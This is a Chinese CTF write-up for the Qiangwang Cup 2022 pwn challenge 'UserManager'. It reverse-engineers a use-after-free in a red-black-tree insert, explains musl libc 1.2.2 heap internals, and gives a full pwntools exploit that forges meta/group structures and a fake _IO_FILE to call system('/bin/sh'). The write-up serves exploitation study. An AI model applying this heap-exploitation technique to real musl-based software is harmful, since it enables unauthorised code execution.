---
title: 强网杯2022 pwn 赛题解析——UserManager
date: 2023-02-28 23:04:00
categories:
- write-ups
- 其他
---
刚刚结束的2022年强网杯中有一道题用到了musl libc，但是之前没有接触过，只能遗憾跳过。本文根据musl libc 1.2.2的源码，和赛题本身，学习一下musl libc的利用方式。

musl libc 是一种轻量级的libc，可以用于嵌入式设备等，其中包含malloc、free等一系列函数的实现都与glibc相差甚远。但由于其轻量化的定位，其实现的代码量也相对较少，便于我们通过源码进行直接分析。

本文主要参考资料：[资料](https://bbs.pediy.com/thread-269533.htm)

# UserManager
本题的musl版本是1.2.2，在新版的Ubuntu 22.04中下载的musl默认版本为1.2.2-4。

## 1. 逆向分析程序
用IDA打开之后，发现其中的符号表大多还在，省去了重命名函数的时间。在Menu函数中，我们可以得知这个程序能够实现的功能有：Add、Check、Delete、Clear。下面依次进行分析。

### 主要数据结构
本题中涉及的数据结构是红黑树。结构体定义如下：
```
00000000 chunk_info      struc ; (sizeof=0x38, mappedto_6)
00000000 Id              dq ?
00000008 name_chunk      dq ?                    ; offset
00000010 name_len        dq ?
00000018 color           dq ?                    ; enum node_type
00000020 parent          dq ?                    ; offset
00000028 right_child     dq ?                    ; offset
00000030 left_child      dq ?                    ; offset
00000038 chunk_info      ends

FFFFFFFF ; enum node_type, mappedto_8, width 8 bytes
FFFFFFFF red              = 1
FFFFFFFF black            = 2
```
那么在初次逆向程序时，我们应该如何得知本题的数据结构是红黑树呢？其重点就在于字段``color``功能的判断。在``insert``函数、``doing``函数、``delete``函数中，只有当``color``表示红黑树中结点的颜色时才能将程序的逻辑解释清楚。这需要一定的直觉与经验，也对我们的逆向能力做出了一定的要求。

### ``Add``函数
```c
int __fastcall add()
{
  __int64 name_len; // rsi
  __int64 id; // [rsp+0h] [rbp-20h]
  char *name_chunk; // [rsp+10h] [rbp-10h]
  chunk_info *chunk; // [rsp+18h] [rbp-8h]

  printf("Id: ");
  id = ReadInt();
  printf("UserName length: ");
  name_len = ReadInt();
  name_chunk = (char *)calloc(1uLL, name_len);
  printf("UserName: ");
  ReadLine(name_chunk, name_len);
  chunk = (chunk_info *)calloc(1uLL, 0x38uLL);
  chunk->Id = id;
  chunk->name_chunk = name_chunk;
  chunk->name_len = name_len;
  chunk->color = red;
  if ( users )
  {
    insert(chunk, users);
  }
  else
  {
    users = chunk;
    chunk->parent = (chunk_info *)0xDEADBEEFLL;
    chunk->color = black;
  }
  return puts("Add ok......\n\n");
}
```
其中``insert``函数就是向红黑树中插入结点的函数。这个红黑树是按照``Id``字段进行排序的，``Id``大的结点位于左边。在``insert``函数中又调用了``doing``函数，这个函数主要是用于插入结点后的红黑树调整，其中``sini``函数的功能是树结点旋转——将参数结点与其父节点顺时针旋转（参数结点是其父节点的左子节点），``dext``函数的功能是树结点旋转——将参数结点与其父节点逆时针旋转（参数结点是其父节点的右子节点）。后面的``delete``函数包含了所有红黑树的删除操作，漏洞点不在那里，故不做分析。

### ``Check``函数
```c
int check()
{
  __int64 Int; // [rsp+0h] [rbp-10h]
  unsigned __int64 *v2; // [rsp+8h] [rbp-8h]

  printf("Id: ");
  Int = ReadInt();
  v2 = find(Int, (unsigned __int64 *)users);
  if ( v2 )
    return write(1, (const void *)v2[1], v2[2]);
  else
    return puts("This user is not exists!\n");
}
```
这里是检查某个用户是否存在，如果存在则会输出用户名。

### ``Insert``函数
本题的漏洞点在于``insert``函数。
```c
void __fastcall insert(chunk_info *victim, chunk_info *base)
{
  while ( base )
  {
    if ( victim->Id == base->Id )// 如果要插入的victim的Id与base相等，则使用victim替换base，并将原来的base释放
    {
      victim->color = base->color;
      victim->right_child = base->right_child;
      victim->left_child = base->left_child;
      victim->parent = base->parent;
      if ( base->right_child )
        base->right_child->parent = victim;
      if ( base->left_child )
        base->left_child->parent = victim;
      if ( base->parent != (chunk_info *)0xDEADBEEFLL )
      {
        if ( base == base->parent->right_child )
          base->parent->right_child = victim;
        else
          base->parent->left_child = victim;
      }
      free(base->name_chunk);
      free(base);
      return;
    }
    if ( victim->Id >= base->Id )
    {
      if ( !base->left_child )
      {
        victim->parent = base;
        base->left_child = victim;
        doing(victim);
        if ( !victim->right_child && !victim->left_child )
          base->color = black;
        return;
      }
      base = base->left_child;
    }
    else
    {
      if ( !base->right_child )
      {
        base->right_child = victim;
        victim->parent = base;
        if ( victim->color == red )
          doing(victim);
        if ( !victim->right_child && !victim->left_child )
          victim->color = black;
        return;
      }
      base = base->right_child;
    }
  }
}
```
需要注意当两次插入的``Id``相等时，会将原红黑树中对应的结点替换并释放。但如果原红黑树中被替换的结点是根节点，那么表示根节点的``users``指针就并不会改变。并且，根节点的释放是在分配新结点之后，因此我们通过分配新的结点就很有可能分配到根节点的结构体本身，这样也就能够对根节点的所有字段进行任意修改了。

## 2. 漏洞分析与利用
### Step 1: 获取elf加载基地址
首先，我们需要知道应该如何才能分配到根节点chunk，这就涉及musl libc中的堆结构管理了。在musl libc中，相同大小的chunk被归为一个group中进行管理，一个group中只能存放有限个数的chunk，一个group有一个对应的meta进行管理。**与glibc不同的是，musl中被释放的chunk在下一次相同申请大小的malloc时不一定会被分配，只有当group中找不到空闲的chunk时才会使用已经被释放的chunk**。因此这需要我们对group进行填充。

本题中我们首先需要利用UAF漏洞获取到musl libc的基地址，但几乎所有的chunk都位于堆中，我们无法直接获取到libc中的地址。因此，我们需要首先泄露程序本身的加载地址。通过调试发现，存放meta等结构的内存空间紧邻程序内存，且在其上方的位置，所以我们可以首先通过泄露堆地址获取到程序加载地址：

在每一次``add``时，程序都会``calloc``一个大小为0x38的chunk，实际的分配大小为``0x40``。经过调试（调试方法参见[资料](https://bbs.pediy.com/thread-269533.htm)）发现，管理chunk大小为0x40的group的容量为7，即最多只能容纳7个chunk。因此我们可以考虑首先分配掉5个chunk，然后分配根节点，并使其保存name的chunk也分配到这个group中，通过``add``相同``Id``的``user``让其释放，此时只有原根节点的``name``这个chunk被释放了，因为相同``Id``的结构体占用了原根节点的结构体空间，当我们再一次``add``时，这个chunk就会被用作``user``结构体，我们通过``check``就能够读取到其中的一些指针值。

![](1.png)
```python
for i in range(5):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
add(11, 0x38, p64(11 + 0xdeadbeef00) + b'\n')
add(11, 0x78, p64(11 + 0xdeadbeef00) + b'\n')
add(9, 0x78, p64(9 + 0xdeadbeef00) + b'\n')
check(11)
```
由此，我们就成功获取了堆空间地址，进而得到了程序加载的基地址。
### Step 2: 获取libc加载基地址
下一步，我们就需要想办法读取到程序中保存的``stdout``的值，以获取libc的基地址。由于在正常情况下堆地址不会分配到那个地方，因此我们需要能够修改根节点的结构体本身。可行的方法是：分配掉5个chunk，之后分配根节点，根节点的``name``大小也为0x38。然后我们重新分配根节点，释放前面的一个结点。此时7个chunk中一共就有3个被释放，依次是前面的一个chunk、原根节点结构体chunk、原根节点``name``的chunk。当我们此时再一次分配一个chunk，且将``name``的大小也设置为0x38时，我们就能够将``name``的chunk申请到原根节点结构体，从而直接修改原根节点结构体中``name``指针的值。不过需要注意的是，本题中添加和删除的操作较为复杂，随意修改三个二叉树指针很可能会导致程序崩溃退出，但经过调试发现，指针的值相对于elf文件加载地址的偏移始终不变。我们在上一步已经知道了elf的加载地址，因此我们在写的时候可以不修改指针的值，而是只修改``name``指针的值，避免程序崩溃。

```python
clear()

for i in range(5):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
add(11, 0x38, p64(11 + 0xdeadbeef00) + b'\n')
add(11, 0x78, p64(11 + 0xdeadbeef00) + b'\n')
delete(4)
print(hex(heap_addr))

payload = p64(4)
payload += p64(stdout)
payload += p64(0x20)
payload += p64(1)
payload += p64(elf_base + 0x51e0)
payload += p64(elf_base + 0x50e0)
payload += p64(0)

add(15, 0x38, payload)

payload = p64(11)
payload += p64(stdout)
payload += p64(0x38)
payload += p64(2)
payload += p64(0xdeadbeef)
payload += p64(elf_base + 0x5120)
payload += p64(elf_base + 0x5160)

add(13, 0x38, payload)
check(11)
```
![](2.png)
成功获取``stdout``的值。

### Step 3: 获取``__malloc_context``结构体中的``secret``值
和第二步相同，我们如法炮制。
```python
clear()

for i in range(6):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
clear()

for i in range(4):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
add(11, 0x38, p64(11 + 0xdeadbeef00) + b'\n')
add(11, 0x78, p64(11 + 0xdeadbeef00) + b'\n')
delete(3)
print(hex(heap_addr))

payload = p64(4)
payload += p64(__malloc_context)
payload += p64(0x20)
payload += p64(1)
payload += p64(elf_base + 0x51e0)
payload += p64(elf_base + 0x50e0)
payload += p64(0)

add(15, 0x38, payload)

payload = p64(11)
payload += p64(__malloc_context)
payload += p64(0x38)
payload += p64(2)
payload += p64(0xdeadbeef)
payload += p64(elf_base + 0x5120)
payload += p64(elf_base + 0x5160)

add(13, 0x38, payload)
check(11)
```
![](3.png)
成功获取``secret``值。

### Step 4: 申请大空间，伪造``meta_area, meta, group, chunk``
现在，我们已经掌握了伪造chunk并释放所需的所有数据了，因此可以开始伪造相关结构了。对于musl libc pwn来说，从meta_area这个外层结构一直伪造到chunk这个最内层结构是较为常见的操作。我们通过伪造这些结构调用到``dequeue``这个函数实现类似于glibc中unlink的利用。在本题中，我们可以通过分配一个大于0x1000的chunk来完成伪造（因为所有``meta_area``必须页对齐）。经过调试发现，当我们分配一个大chunk时，musl libc会为我们开辟一块新的空间专门用于存放，这个空间是一个 **``group``**。因此实际上开始写的地址后12比特应该为``0x030``。我们跳过本页，在下一页进行伪造。

经过调试发现，用于保存大chunk的group分配到的mmap空间就在libc加载地址的正下方，大小为0x5000。因此我们可以获取到这块空间的地址，并在假的``meta``结构中写入假的``group``地址。

```c
struct _IO_FILE {
	unsigned flags;
	unsigned char *rpos, *rend;
	int (*close)(FILE *);
	unsigned char *wend, *wpos;
	unsigned char *mustbezero_1;
	unsigned char *wbase;
	size_t (*read)(FILE *, unsigned char *, size_t);
	size_t (*write)(FILE *, const unsigned char *, size_t);
	off_t (*seek)(FILE *, off_t, int);
	unsigned char *buf;
	size_t buf_size;
	FILE *prev, *next;
	int fd;
	int pipe_pid;
	long lockcount;
	int mode;
	volatile int lock;
	int lbf;
	void *cookie;
	off_t off;
	char *getln_buf;
	void *mustbezero_2;
	unsigned char *shend;
	off_t shlim, shcnt;
	FILE *prev_locked, *next_locked;
	struct __locale_struct *locale;
};
```
这是musl libc中的``_IO_FILE``结构体，一般的利用方式是伪造一个假的``_IO_FILE``结构体，将``read``、``write``、``close``、``seek``函数指针覆写。注意，musl libc中没有one_gadget，因此我们只能将函数指针改写为``system``函数的地址，将``_IO_FILE``开头改写为字符串``/bin/sh``。

这一部分看起来容易，实际上不简单，需要我们经过反复调试才能成功unlink假的``meta``。

本题的exp中还有很多的细节值得注意，就比如fake meta中应该将fake FILE的地址放在prev指针还是next指针？注意dequeue的代码：
```c
m->prev->next = m->next;
m->next->prev = m->prev;
```
其中`m->prev`的地址就是`m`的地址，`m->next`的地址为`m+8`。在`close_file`函数中调用函数的语句中第1个参数是FILE结构体地址，因此我们需要将`/bin/sh`字符串写到FILE结构体的开始位置，如果将`__stdout_used`地址放在fake meta的`prev`指针位置，那么执行了`m->next->prev = m->prev;`之后，我们的fake FILE结构体的开头8字节就被修改了，覆盖了`/bin/sh`字符串。因此应该将`__stdout_used`写到`next`指针的位置。

exp：
```py
from pwn import *
context(arch='amd64', log_level='debug')

elf = ELF('./UserManager')
libc = ELF('/lib/x86_64-linux-musl/libc.so')

# io = process(['./UserManager'], env={'LD_PRELOAD': './libc.so'})
io = process('./UserManager')

def add(id, namelen, name):
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b'Id: ', str(id).encode())
    io.sendlineafter(b'UserName length: ', str(namelen).encode())
    io.sendafter(b'UserName: ', name)

def check(id):
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b'Id: ', str(id).encode())

def delete(id):
    io.sendlineafter(b': ', b'3')
    io.sendlineafter(b'Id: ', str(id).encode())

def clear():
    io.sendlineafter(b': ', b'4')

# get heap address and elf base
for i in range(5):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
add(11, 0x38, p64(11 + 0xdeadbeef00) + b'\n')
add(11, 0x78, p64(11 + 0xdeadbeef00) + b'\n')
add(9, 0x78, p64(9 + 0xdeadbeef00) + b'\n')
check(11)
io.recv(8)
heap_addr = u64(io.recv(8))
elf_base = heap_addr - 0x5A40
stdout_ptr = elf_base + 0x4D80
log.info('ELF base = ' + hex(elf_base))
log.info('heap address got: ' + hex(elf_base))

# get libc base
clear()

for i in range(5):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
add(11, 0x38, p64(11 + 0xdeadbeef00) + b'\n')
add(11, 0x78, p64(11 + 0xdeadbeef00) + b'\n')
delete(4)

payload = p64(4)
payload += p64(stdout_ptr)
payload += p64(0x20)
payload += p64(1)
payload += p64(elf_base + 0x51e0)
payload += p64(elf_base + 0x50e0)
payload += p64(0)

add(15, 0x38, payload)

payload = p64(11)
payload += p64(stdout_ptr)
payload += p64(0x38)
payload += p64(2)
payload += p64(0xdeadbeef)
payload += p64(elf_base + 0x5120)
payload += p64(elf_base + 0x5160)

add(13, 0x38, payload)
check(11)

stdout = u64(io.recv(8))
log.info('stdout = ' + hex(stdout))
libc_base = stdout - 0xAD280
sys = libc_base + libc.symbols['system']
__malloc_context = libc_base + 0xAD9C0
log.info('libc base = ' + hex(libc_base))
stdout_ptr = libc_base + 0xAD3B0

clear()

for i in range(6):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
clear()

for i in range(4):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
add(11, 0x38, p64(11 + 0xdeadbeef00) + b'\n')
add(11, 0x78, p64(11 + 0xdeadbeef00) + b'\n')
delete(3)
print(hex(heap_addr))

payload = p64(4)
payload += p64(__malloc_context)
payload += p64(0x20)
payload += p64(1)
payload += p64(elf_base + 0x51e0)
payload += p64(elf_base + 0x50e0)
payload += p64(0)

add(15, 0x38, payload)

payload = p64(11)
payload += p64(__malloc_context)
payload += p64(0x38)
payload += p64(2)
payload += p64(0xdeadbeef)
payload += p64(elf_base + 0x5120)
payload += p64(elf_base + 0x5160)

add(13, 0x38, payload)
check(11)
secret = u64(io.recv(8))
log.info('secret value = ' + hex(secret))

clear()
for i in range(8):
    add(i, 0x78, p64(i + 0xdeadbeef00) + b'\n')
clear()

payload = p64(secret)       							# meta_area.secret          0x0
payload += p64(0)           							# meta_area.next
payload += p64(0x65)        							# meta_area.nslots (struct meta[])          0x10
payload += p64(libc_base - 0x6000 + 0x1000 + 0xA0)  	# meta.prev (struct meta*)
payload += p64(stdout_ptr)  							# meta.next (struct meta*)                  0x20
payload += p64(libc_base - 0x6000 + 0x1000 + 0x50)  	# meta.mem (struct group*)
payload += p32(0)           							# meta.avail_mask
payload += p32(0b111101)           						# meta.free_mask
payload += p64(5 + (1 << 5) + (3 << 6) + (1 << 12))     			# meta.last_idx, freeable, size_class, maplen(=0)       0x30
payload += p64(0) * 2
payload += p64(libc_base - 0x6000 + 0x1000 + 0x18)  	# group.meta (struct meta*)     0x48
payload += p64(0x800000000006)           				# group.active_idx
fake_file = flat({
        0: b"/bin/sh\x00",
        0x28: 0xdeadbeef,
        0x38: 0,
        0x48: sys
    }, filler=b'\x00')
payload += b'\x00' * 0x3D + p8(1) + p16(4) + fake_file                # fake _IO_FILE struct, 0x58

for i in range(4):
    add(i, 0x78, p64(0xdeadbeef00 + i) + b'\n')
add(100, 0x38, p64(0xdeadbeef) + b'\n')
add(100, 0x1300, cyclic(0x1000 - 0x40) + payload + b'\n')
delete(3)
add(99, 0x38, p64(98) + p64(libc_base - 0x6000 + 0x1000 + 0xA0) + p64(0x38) + p64(2) + p64(0xdeadbeef) + p64(0) * 2)
delete(98)
# gdb.attach(io, 'b *$rebase(0x28A9)')
# time.sleep(1)
# add(98, 0x38, p64(101) + p64(libc_base - 0x6000 + 0x1000 + 0x60) + p64(0x38) + p64(2) + p64(0xdeadbeef) + p64(libc_base - 0x1f00) + p64(0))
io.sendlineafter(b': ', b'5')	# call exit

io.interactive()
```